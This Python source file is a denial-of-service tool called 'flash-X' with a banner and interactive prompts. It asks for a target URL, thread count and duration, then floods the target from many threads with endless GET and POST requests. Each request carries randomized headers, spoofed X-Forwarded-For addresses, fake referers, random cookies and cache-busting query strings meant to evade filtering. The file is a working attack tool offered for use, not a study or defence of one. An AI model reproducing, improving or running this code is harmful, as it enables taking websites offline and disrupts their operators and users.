import os
import json
import random
import string
import threading
import time
import warnings
from urllib.parse import urlparse
from typing import Dict, List

import requests
import faker
from colorama import Fore as F
from fake_useragent import UserAgent
from halo import Halo
import cfonts
from requests.exceptions import ConnectionError, Timeout

os.system('clear')

with open("info.json", "r") as f:
    data = json.load(f)
    version = data["version"]
    auther = data["auther"]

sip = Halo()
print(f"""{F.CYAN}
                                                                ⣠⣤⣤⣤⣤⣤⣤⡄⠀⠀⠀⠀⠀⠀⠀
                                                ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠇⠀⠀⠀⣰⣿⠁⠀⠀⠀⠀⠀⠀⠀
                                                ⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣶⣶⣶⣶⣾⣿⣶⠀⠀⢠⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀
                                                ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⠁⠀⠀⠀⣾⣿⣤⣤⣤⠀⠀⠀⠀⠀⠀
                                                ⠀⠀⠀⠀⠀⠀⣤⣤⣤⣤⣤⣤⣤⣾⡏⠀⠀⠀⠀⠉⢉⣿⠟⠁⠀⠀⠀⠀⠀⠀
                                                ⠀⠀⠀⠀⠀⠀⠈⠉⠉⠉⠉⠉⠙⠿⠿⣿⡿⠀⠀⣴⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀
                                                ⠀⠀⠀⠀⠀⠀⠀⠀⣤⣤⣤⣤⣤⣤⣤⣿⠃⣠⣾⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                                                ⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠉⠉⠉⣿⢧⣾⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                                                ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⡿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                                                ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⠋⠀⠀
""")

logo = cfonts.render(
    text="flash-X",
    colors=["white", "cyan"],
    align="center"
)
print(logo)
print('-' * 60)
print(f"""
Version : {F.CYAN}{version} {F.RESET}( {F.CYAN}2024 {F.WHITE}- {F.CYAN}11 {F.WHITE}- {F.CYAN}20 {F.RESET}).
Auther  : {F.CYAN}{auther}{F.RESET}.
Method  : {F.CYAN}HTTP{F.RESET}.
""")
print('-' * 60)

fake = faker.Faker()
warnings.filterwarnings("ignore", message="Unverified HTTPS request")
ua = UserAgent()
host = None


def buildBlock(size):
    out_str = ''
    validChars = list(range(97, 122)) + list(range(65, 90)) + list(range(48, 57))
    for _ in range(size):
        out_str += chr(random.choice(validChars))
    return out_str


def generateQueryString(ammount=1):
    queryString = []
    for _ in range(ammount):
        key = buildBlock(random.randint(3, 10))
        value = buildBlock(random.randint(3, 20))
        queryString.append(f"{key}={value}")
    return '&'.join(queryString)


def buildcookies():
    cookies = {}
    for _ in range(1):
        key = ''.join(random.choices(string.ascii_letters, k=random.randint(4, 10)))
        value = ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(10, 15)))
        cookies[key] = value
    return cookies


def referesBot():
    bots = [
        'http://www.google.com/',
        'http://www.bing.com/',
        'http://www.baidu.com/',
        'http://www.yandex.com/',
        'http://' + host + '/'
    ]
    return random.choice(bots) + generateQueryString(random.randint(1, 10))


def generate_headers():
    noCacheDirectives = ['no-cache', 'max-age=0']
    random.shuffle(noCacheDirectives)
    noCache = ', '.join(noCacheDirectives[:random.randint(1, len(noCacheDirectives) - 1)])
    acceptEncoding = ['\'\'', '*', 'identity', 'gzip', 'deflate']
    random.shuffle(acceptEncoding)
    roundEncodings = acceptEncoding[:random.randint(1, int(len(acceptEncoding) / 2))]
    return {
        "User-Agent": ua.random,
        "X-Requested-With": "XMLHttpRequest",
        "Pragma": "no-cache",
        "Cache-Control": noCache,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Encoding": ', '.join(roundEncodings),
        "Accept-Charset": "ISO-8859-1,utf-8;q=0.7,*;q=0.7",
        "Accept-Language": "en-US,en;q=0.9",
        "Referer": referesBot(),
        "Content-Type": random.choice(['multipart/form-data', 'application/x-url-encoded']),
        "DNT": "1",
        "Upgrade-Insecure-Requests": "1",
        "Connection": "keep-alive",
        "Keep-Alive": str(random.randint(1, 1000)),
        "X-Forwarded-For": fake.ipv4(),
        "Cookie": generateQueryString(random.randint(1, 5))
    }


def flood(target: str) -> None:
    global proxies
    type_request = random.choice(["GET", "POST"])
    headers = generate_headers()
    while True:
        try:
            if type_request == "GET":
                response = requests.get(target, headers=headers, params=generateQueryString(random.randint(1, 5)), timeout=5)
            else:
                response = requests.post(target, headers=headers, timeout=5)
            status = f"{F.GREEN if response.status_code == 200 else F.RED}({response.status_code}){F.RESET}"
            print(f"{status} {F.CYAN}{type_request}{F.RESET} Successful Attack!")
            time.sleep(timeSleep)
        except (Timeout, OSError):
            print(f"{F.RED}( !!! ) {F.RESET}Time Out...")
            continue


def start_flooding(target: str, thread_count: int, duration: int) -> None:
    stop_time = time.time() + duration
    for _ in range(thread_count):
        thread = threading.Thread(target=flood, args=(target,))
        thread.daemon = True
        thread.start()
    while time.time() < stop_time:
        time.sleep(timeSleep)
    print(f"\n{F.CYAN}( Done ) {F.GREEN}Attack finished after {F.RED}{duration} seconds.{F.RESET}")


if __name__ == "__main__":
    target_url = input(f"\n{F.CYAN}┌─({F.GREEN}flashX{F.CYAN})─({F.YELLOW}~ TARGET URL{F.CYAN})\n└──{F.YELLOW}~: {F.GREEN}")
    num_threads = int(input(f"\n{F.CYAN}┌─({F.GREEN}flashX{F.CYAN})─({F.YELLOW}~ THREADS{F.CYAN})\n└──{F.YELLOW}~: {F.GREEN}"))
    duration = int(input(f"\n{F.CYAN}┌─({F.GREEN}flashX{F.CYAN})─({F.YELLOW}~ TIME ATTACK{F.CYAN})\n└──{F.YELLOW}~: {F.GREEN}"))
    timeSleep = int(input(f"\n{F.CYAN}┌─({F.GREEN}flashX{F.CYAN})─({F.YELLOW}~ TIME SLEEP{F.CYAN})\n└──{F.YELLOW}~: {F.GREEN}"))
    print(f"\n- {F.GREEN}Attack On : {F.RED} {target_url} {F.RESET}\n- {F.GREEN}Time attack : {F.RED}{duration}{F.RESET}")
    sipp = Halo(text="Loding ...", spinner="dots")
    sipp.start()
    time.sleep(2)
    sipp.stop()
    start_flooding(target_url, num_threads, duration)